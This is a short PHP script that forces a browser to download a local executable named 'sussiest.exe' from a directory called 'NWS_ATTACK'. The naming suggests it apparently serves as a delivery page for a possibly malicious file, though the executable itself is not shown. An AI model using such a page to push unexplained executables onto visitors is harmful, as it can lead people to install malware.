<?php
// Set the file path
$filePath = 'D:\NWS_ATTACK\NWS_ATTACK\dist\sussiest.exe'; // Replace 'path_to_your_executable_file.exe' with the actual path to your executable file

// Content-Disposition: inline; filename="file.exe"
header('Content-Disposition: attachment; filename="sussiest.exe"');
header("Content-Type: application/octet-stream");
readfile($filePath);
exit;
?>